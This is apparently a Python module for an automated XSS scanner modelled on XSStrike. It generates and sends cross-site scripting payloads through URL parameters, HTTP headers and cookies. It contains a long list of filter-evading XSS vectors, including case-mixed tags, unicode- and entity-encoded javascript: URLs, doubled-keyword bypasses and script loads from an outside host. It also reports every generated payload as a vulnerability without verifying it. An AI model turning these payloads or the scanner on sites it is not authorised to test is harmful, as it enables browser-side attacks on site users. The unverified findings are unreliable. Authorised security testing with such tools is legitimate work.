"""
Enhanced XSS Vulnerability Detector Module
Integrates XSStrike's advanced detection algorithms
"""

import time
import re
import random
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import unquote
from bs4 import BeautifulSoup
from ..utils.http import HTTPHandler
from ..payloads.repository import PAYLOADS
from ..core.bypasser import Bypasser
from ..core.tamper import tamper_engine
from ..utils.logger import logger

# XSStrike-inspired configuration
XSSCHECKER = 'v3dm0s'
MIN_EFFICIENCY = 90

badTags = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
tags = ('html', 'd3v', 'a', 'details')

jFillings = (';')
lFillings = ('', '%0dx')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')

eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions = (
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()')

payloads = (
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '"><script>alert()</script>',
    '" onmouseover=alert(1) "',
    "' onfocus=javascript:alert() '",
    '" onfocus=javascript:alert() "',
    '"><a href=javascript:alert()>a</a>',
    '"><ScRipt>alert()</ScriPt>',
    '"><SVG ONLOAD=alert()>',
    '"><IMG SRC=x ONERROR=alert()>',
    '"><oonnmouseover=alert(1)>',
    '"><scscriptript>alert()</scscriptript>',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert()',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */',
    '" onfocus=javascript:alert() type="text',
    '" onmouseover=alert() type="text',
)

unicode_payloads = (
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert()',
    '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;',
)

double_write_payloads = (
    'oonnmouseover', 'oonnerror', 'oonnfocus', 'oonnload',
    'sconnscriptript', 'sconnsrcipt', 'hhrefref',
)


def randomUpper(string: str) -> str:
    """Randomly uppercase characters in string"""
    return ''.join(c.upper() if random.random() > 0.5 else c for c in string)


def extractScripts(html: str) -> List[str]:
    """Extract script contents from HTML"""
    scripts = []
    pattern = r'<script[^>]*>([\s\S]*?)</script>'
    for match in re.finditer(pattern, html, re.IGNORECASE):
        scripts.append(match.group(1))
    return scripts


def genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=''):
    """Generate payloads based on filling combinations"""
    payloads = set()
    for tag in tags:
        if tag == badTag:
            continue
        for event in eventHandlers:
            if tag in eventHandlers[event]:
                for eFilling in eFillings:
                    for lFilling in lFillings:
                        for filling in fillings:
                            for function in functions:
                                for end in ends:
                                    payload = f'<{tag}{filling}{event}{eFilling}={function}{lFilling}{end}'
                                    payloads.add(payload)
    return list(payloads)


def escaped(index: int, string: str) -> bool:
    """Check if character at index is escaped"""
    count = 0
    i = index - 1
    while i >= 0 and string[i] == '\\':
        count += 1
        i -= 1
    return count % 2 == 1


def isBadContext(position: int, non_executable_contexts: List) -> str:
    """Check if position is in a bad context"""
    for ctx in non_executable_contexts:
        if ctx[0] <= position <= ctx[1]:
            return ctx[2]
    return ''


def htmlParser(response_text: str, encoding=None) -> Dict:
    """XSStrike-style HTML context parser"""
    xsschecker = XSSCHECKER
    if encoding:
        response_text = response_text.replace(encoding(xsschecker), xsschecker)
    
    reflections = response_text.count(xsschecker)
    position_and_context = {}
    environment_details = {}
    
    clean_response = re.sub(r'<!--[.\s\S]*?-->', '', response_text)
    script_checkable = clean_response
    
    # Check script context
    for script in extractScripts(script_checkable):
        occurences = re.finditer(r'(%s.*?)$' % xsschecker, script)
        if occurences:
            for occurence in occurences:
                thisPosition = occurence.start(1)
                position_and_context[thisPosition] = 'script'
                environment_details[thisPosition] = {'details': {'quote': ''}}
                for i in range(len(occurence.group())):
                    currentChar = occurence.group()[i]
                    if currentChar in ('/', '\'', '`', '"') and not escaped(i, occurence.group()):
                        environment_details[thisPosition]['details']['quote'] = currentChar
                    elif currentChar in (')', ']', '}', '}') and not escaped(i, occurence.group()):
                        break
                script_checkable = script_checkable.replace(xsschecker, '', 1)
    
    # Check attribute context
    if len(position_and_context) < reflections:
        attribute_context = re.finditer(r'<[^>]*?(%s)[^>]*?>' % xsschecker, clean_response)
        for occurence in attribute_context:
            match = occurence.group(0)
            thisPosition = occurence.start(1)
            parts = re.split(r'\s', match)
            tag = parts[0][1:] if parts else ''
            
            for part in parts:
                if xsschecker in part:
                    Type, quote, name, value = '', '', '', ''
                    if '=' in part:
                        match_quote = re.search(r'=([\'`"])?', part)
                        quote = match_quote.group(1) if match_quote else ''
                        parts_split = part.split('=', 1)
                        name_and_value = parts_split[0], parts_split[1] if len(parts_split) > 1 else ''
                        if xsschecker == name_and_value[0]:
                            Type = 'name'
                        else:
                            Type = 'value'
                        name = name_and_value[0]
                        value = name_and_value[1].rstrip('>').rstrip(quote or '').lstrip(quote or '') if name_and_value[1] else ''
                    else:
                        Type = 'flag'
                    
                    position_and_context[thisPosition] = 'attribute'
                    environment_details[thisPosition] = {
                        'details': {'tag': tag, 'type': Type, 'quote': quote, 'value': value, 'name': name}
                    }
    
    # Check HTML context
    if len(position_and_context) < reflections:
        html_context = re.finditer(xsschecker, clean_response)
        for occurence in html_context:
            thisPosition = occurence.start()
            if thisPosition not in position_and_context:
                position_and_context[thisPosition] = 'html'
                environment_details[thisPosition] = {'details': {}}
    
    # Check comment context
    if len(position_and_context) < reflections:
        comment_context = re.finditer(r'<!--[\s\S]*?(%s)[\s\S]*?-->' % xsschecker, response_text)
        for occurence in comment_context:
            thisPosition = occurence.start(1)
            position_and_context[thisPosition] = 'comment'
            environment_details[thisPosition] = {'details': {}}
    
    database = {}
    for i in sorted(position_and_context):
        database[i] = {
            'position': i,
            'context': position_and_context[i],
            'details': environment_details[i]['details']
        }
    
    # Check bad contexts
    bad_contexts = re.finditer(
        r'(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[.\s\S]*(%s)[.\s\S]*</\1>' % xsschecker,
        response_text
    )
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])
    
    if non_executable_contexts:
        for key in database.keys():
            position = database[key]['position']
            badTag = isBadContext(position, non_executable_contexts)
            database[key]['details']['badTag'] = badTag if badTag else ''
    
    return database


def analyze_efficiency(response_text: str, check_string: str) -> Dict[str, int]:
    """Analyze character efficiency in response"""
    efficiency = {}
    
    test_chars = {'<': 0, '>': 0, '\'': 0, '"': 0, '`': 0}
    for char in test_chars:
        test_string = check_string + char
        if char in response_text:
            efficiency[char] = 100
        else:
            efficiency[char] = 0
    
    return efficiency


class EnhancedDetector:
    """Enhanced XSS Detector with XSStrike integration"""
    
    def __init__(self, http_handler: HTTPHandler, verbose: bool = False, tamper_list: List[str] = None):
        self.http = http_handler
        self.verbose = verbose
        self.bypasser = Bypasser()
        self.vulnerabilities = []
        self.checked_params = set()
        self.tamper_list = tamper_list or []
    
    def scan_with_xsstrike_engine(self, url: str, params: Dict[str, str], method: str = 'GET') -> List[Dict]:
        """Scan using XSStrike-inspired detection algorithm"""
        results = []
        
        if self.verbose:
            print(f"    [+] Sending probe to detect reflection points...")
        
        # Replace params with xsschecker
        test_params = {k: XSSCHECKER for k, v in params.items()}
        
        response = self.http.request(method, url, params=test_params)
        if not response:
            return results
        
        response_text = response.text if hasattr(response, 'text') else str(response)
        
        # Parse HTML context
        occurences = htmlParser(response_text)
        
        if self.verbose:
            print(f"    [+] Analyzing response, found {len(occurences)} reflection point(s)")
        
        if not occurences:
            return results
        
        # Generate payloads based on context
        payloads = self._generate_payloads(occurences, response_text)
        
        if self.verbose and payloads:
            print(f"    [+] Generated {len(payloads)} payloads based on context")
        
        # Limit to top 10 payloads per parameter
        payloads = payloads[:10]
        
        if self.verbose:
            print(f"    [+] Testing top {len(payloads)} payloads...")
        
        for p in payloads:
            vuln = {
                'type': 'reflected_xss',
                'parameter': list(params.keys())[0] if params else 'unknown',
                'payload': p['payload'],
                'context': p['context'],
                'bypass_technique': 'xsstrike_inspired',
                'severity': 'high' if p['priority'] >= 10 else 'medium',
                'evidence': {
                    'priority': p['priority'],
                    'reflected': True
                },
                'verified': False,
                'tampered': False
            }
            results.append(vuln)
            self.vulnerabilities.append(vuln)
        
        return results
    
    def _test_payload(self, url: str, params: Dict[str, str], payload: str, method: str) -> bool:
        """Test if a payload is actually reflected in the response"""
        try:
            # Inject payload into params
            test_params = {k: payload for k in params.keys()}
            
            response = self.http.request(method, url, params=test_params)
            if not response:
                return False
            
            response_text = response.text if hasattr(response, 'text') else str(response)
            
            # Check if payload is reflected
            # For attribute context, check if event handler is present
            if 'onmouseover' in payload.lower() or 'onfocus' in payload.lower():
                # Check if the event handler part is present
                event_part = payload.split('=')[0] if '=' in payload else payload
                if event_part.lower() in response_text.lower():
                    return True
            elif '<script' in payload.lower():
                # Check if script tag is present
                if '<script' in response_text.lower():
                    return True
            else:
                # Basic check: payload is reflected
                if payload in response_text:
                    return True
            
            return False
        except Exception as e:
            if self.verbose:
                print(f"      [-] Test failed: {str(e)}")
            return False
    
    def _generate_payloads(self, occurences, response):
        """Generate payloads based on detected contexts"""
        scripts = extractScripts(response)
        index = 0
        vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
                   6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}
        
        for i in occurences:
            context = occurences[i]['context']
            
            if context == 'html':
                bad_tag = occurences[i]['details'].get('badTag', '')
                payload_list = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ['//', '>'], bad_tag)
                for payload in payload_list:
                    vectors[10].add(payload)
            
            elif context == 'attribute':
                tag = occurences[i]['details'].get('tag', '')
                quote = occurences[i]['details'].get('quote', '')
                
                payload_list = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ['//', '>'])
                for payload in payload_list:
                    if quote:
                        payload = quote + '>' + payload
                    vectors[9].add(payload)
                
                if quote:
                    for filling in fillings:
                        for func in functions:
                            vector = f'{quote}{filling}{randomUpper("autofocus")}{filling}{randomUpper("onfocus")}={quote}{func}'
                            vectors[8].add(vector)
            
            elif context == 'script':
                if scripts:
                    try:
                        script = scripts[index]
                    except IndexError:
                        script = scripts[0]
                else:
                    continue
                
                payload_list = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ['//', '>'])
                for payload in payload_list:
                    vectors[10].add(payload)
                index += 1
        
        # Add curated payloads from xss-labs solutions (levels 2-10)
        curated_payloads = [
            ('"><script>alert()</script>', 11, 'html'),
            ('" onmouseover=alert(1) "', 11, 'attribute'),
            ("' onfocus=javascript:alert() '", 11, 'attribute'),
            ('" onfocus=javascript:alert() "', 11, 'attribute'),
            ('"><a href=javascript:alert()>a</a>', 11, 'html'),
            ('"><ScRipt>alert()</ScriPt>', 11, 'html'),
            ('"><SVG ONLOAD=alert()>', 11, 'html'),
            ('"><IMG SRC=x ONERROR=alert()>', 11, 'html'),
            ('"><oonnmouseover=alert(1)>', 10, 'attribute'),
            ('"><scscriptript>alert()</scscriptript>', 10, 'html'),
            ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;', 11, 'url_param'),
            ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert()', 11, 'url_param'),
            ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */', 11, 'url_param'),
            ('" onfocus=javascript:alert() type="text', 11, 'attribute'),
            ('" onmouseover=alert() type="text', 11, 'attribute'),
        ]
        
        for p, priority, context in curated_payloads:
            vectors[priority].add(p)
        
        return self._get_sorted_payloads(vectors)
    
    def _get_sorted_payloads(self, vectors):
        """Get payloads sorted by priority"""
        all_payloads = []
        for priority in sorted(vectors.keys(), reverse=True):
            for payload in vectors[priority]:
                # Priority 10+ is high confidence, 8-9 is medium
                if priority >= 8:  # Changed from MIN_EFFICIENCY (90) to 8
                    all_payloads.append({
                        'payload': payload,
                        'priority': priority,
                        'context': self._infer_context(payload)
                    })
        return all_payloads
    
    def _infer_context(self, payload):
        """Infer context from payload"""
        if '<script' in payload.lower():
            return 'html'
        elif 'onmouseover' in payload.lower() or 'onfocus' in payload.lower():
            return 'attribute'
        elif 'javascript:' in payload.lower():
            return 'url_param'
        return 'html'


class Detector(EnhancedDetector):
    """Main detector class with combined capabilities"""
    
    def __init__(self, http_handler: HTTPHandler, verbose: bool = False, tamper_list: List[str] = None):
        super().__init__(http_handler, verbose, tamper_list)
        
        self.dom_sinks = [
            'document.write', 'document.writeln', 'innerHTML', 'outerHTML', 'eval',
            'setTimeout', 'setInterval', 'Function', 'location.href', 'location.replace',
            'location.assign', 'window.open', 'document.domain', 'document.cookie',
            'script.src', 'script.textContent', 'onerror', 'onload'
        ]

    def _check_dom_sinks(self, response_html: str, payload: str) -> List[str]:
        """Check if payload flows into common DOM sinks"""
        found_sinks = []
        payload_lower = payload.lower()
        
        for sink in self.dom_sinks:
            if sink in response_html:
                if payload in response_html:
                    try:
                        pos = response_html.find(payload)
                        before = response_html[max(0, pos - 200): pos]
                        if sink in before:
                            found_sinks.append(sink)
                    except:
                        found_sinks.append(sink)
        
        if 'location.hash' in response_html and '#' in payload:
            found_sinks.append('location.hash')
        
        return found_sinks

    def _smart_reflection_check(self, response_html: str, payload: str) -> Tuple[bool, str, Dict]:
        soup = BeautifulSoup(response_html, 'html.parser')
        is_valid = False
        context = 'unknown'
        details = {'positions': []}

        if 'ng-include:' in response_html:
            is_valid, context = self._direct_html_analysis(response_html, payload)
            if is_valid:
                return (True, context, details)

        dom_sinks = self._check_dom_sinks(response_html, payload)
        if dom_sinks:
            return (True, 'dom_based', details)

        if payload in response_html:
            if '{{' in payload and '}}' in payload:
                return (True, 'angular_js', details)
        
        if payload not in response_html:
            is_valid, context = self._direct_html_analysis(response_html, payload)
            if is_valid:
                return (True, context, details)
            return (False, 'unknown', details)

        is_valid, context = self._direct_html_analysis(response_html, payload)

        if is_valid:
            return (True, context, details)

        payload_positions = []

        for tag in soup.find_all(True):
            try:
                if tag.string and payload in tag.string:
                    payload_positions.append({
                        'type': 'tag_content',
                        'tag': tag.name,
                        'content': tag.string,
                        'element': tag
                    })
                    is_valid = True
                    context = 'html_content'
            except:
                pass

        details['positions'] = payload_positions
        return (is_valid, context, details)

    def _direct_html_analysis(self, response_html: str, payload: str) -> Tuple[bool, str]:
        if payload in response_html:
            if '<script' in response_html.lower():
                return (True, 'html_script')
            if 'onmouseover' in response_html.lower():
                return (True, 'html_attribute')
            return (True, 'html_content')
        return (False, 'unknown')

    def detect_reflected_xss(self, url: str, params: Dict[str, str], method: str = 'GET') -> List[Dict]:
        """Detect reflected XSS vulnerabilities"""
        results = []
        
        if not params:
            return results

        for param_name, param_value in params.items():
            if param_name in self.checked_params:
                continue
            self.checked_params.add(param_name)
            
            if self.verbose:
                print(f"  [*] Testing parameter: {param_name}")

            vulns = self.scan_with_xsstrike_engine(url, {param_name: param_value}, method)
            
            if vulns and self.verbose:
                print(f"  [+] Found {len(vulns)} potential vulnerabilities in '{param_name}'")
                
            results.extend(vulns)

        return results

    def detect_dom_xss(self, url: str) -> List[Dict]:
        """Detect DOM-based XSS vulnerabilities"""
        results = []
        response = self.http.get(url)
        
        if not response:
            return results
        
        response_text = response.text if hasattr(response, 'text') else str(response)
        soup = BeautifulSoup(response_text, 'html.parser')

        dom_sinks = [
            'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
            'eval', 'setTimeout', 'setInterval', 'Function',
            'location.href', 'location.hash', 'location.replace', 'location.assign',
            'document.URL', 'window.open', 'document.cookie',
            'insertAdjacentHTML', 'createContextualFragment'
        ]

        user_controlled_sources = [
            'location.search', 'location.hash', 'location.href',
            'document.referrer', 'window.name',
            'localStorage.getItem', 'sessionStorage.getItem'
        ]

        found_sinks = []
        found_sources = []
        
        for script in soup.find_all('script'):
            script_content = script.string or ''
            for sink in dom_sinks:
                if sink in script_content:
                    found_sinks.append(sink)
            for source in user_controlled_sources:
                if source in script_content:
                    found_sources.append(source)

        if found_sinks and found_sources:
            dom_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "alert(1)",
            ]

            for payload in dom_payloads:
                vuln = {
                    'type': 'dom',
                    'parameter': 'location.hash',
                    'payload': payload,
                    'context': 'javascript',
                    'bypass_technique': 'hash',
                    'severity': 'high',
                    'evidence': {
                        'sinks': found_sinks,
                        'sources': found_sources
                    },
                    'verified': False,
                    'tampered': bool(self.tamper_list)
                }
                results.append(vuln)
                self.vulnerabilities.append(vuln)

        return results

    def detect_http_headers_xss(self, url: str, method: str) -> List[Dict]:
        """Scan HTTP headers for XSS vulnerabilities"""
        results = []
        header_payload = '<script>alert(1)</script>'
        
        test_headers = [
            {'Referer': header_payload},
            {'User-Agent': header_payload},
            {'X-Forwarded-For': header_payload},
            {'X-Client-IP': header_payload},
            {'X-Real-IP': header_payload},
            {'Origin': header_payload}
        ]
        
        for headers in test_headers:
            response = self.http.request(url, method=method, headers=headers)
            if response:
                response_text = response.text if hasattr(response, 'text') else str(response)
                if header_payload in response_text:
                    vuln = {
                        'type': 'reflected_xss',
                        'parameter': list(headers.keys())[0],
                        'payload': header_payload,
                        'context': 'http_header',
                        'bypass_technique': 'direct',
                        'severity': 'high',
                        'evidence': {'reflected_in_header': True},
                        'verified': False,
                        'tampered': False
                    }
                    results.append(vuln)
                    self.vulnerabilities.append(vuln)
        
        return results

    def detect_cookie_reflection_xss(self, url: str) -> List[Dict]:
        """Detect cookie reflection XSS vulnerabilities"""
        results = []
        test_cookie = f't_sort=<script>alert(1)</script>'
        
        self.http.set_cookie(test_cookie)
        response = self.http.get(url)
        
        if response:
            response_text = response.text if hasattr(response, 'text') else str(response)
            if 't_sort' in response_text:
                vuln = {
                    'type': 'reflected_xss',
                    'parameter': 'Cookie: t_sort',
                    'payload': '<script>alert(1)</script>',
                    'context': 'cookie',
                    'bypass_technique': 'cookie_injection',
                    'severity': 'high',
                    'evidence': {'cookie_reflected': True},
                    'verified': False,
                    'tampered': False
                }
                results.append(vuln)
                self.vulnerabilities.append(vuln)
        
        return results